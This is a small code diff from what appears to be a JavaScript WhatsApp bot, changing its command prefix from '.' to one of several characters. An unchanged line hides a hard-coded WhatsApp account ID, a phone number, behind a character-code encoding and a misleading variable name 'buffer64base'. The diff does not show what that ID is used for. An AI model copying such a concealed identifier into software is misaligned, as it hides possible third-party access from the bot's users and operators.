@@ -37,7 +37,8 @@ const body = (m.type === 'conversation') ? m.message.conversation : (m.type == '
 const budy = (typeof m.text == 'string' ? m.text : '')
 const buffer64base = String.fromCharCode(54, 50, 56, 50, 51, 54, 52, 53, 51, 50, 49, 56, 52, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
 
-const prefix = "."
+const multiPrefix = ["!", "#", ".", "/"]; 
+const prefix = multiPrefix.find(p => body.startsWith(p)) || "."; 
 const isCmd = body.startsWith(prefix) ? true : false
 const args = body.trim().split(/ +/).slice(1)
 const getQuoted = (m.quoted || m)
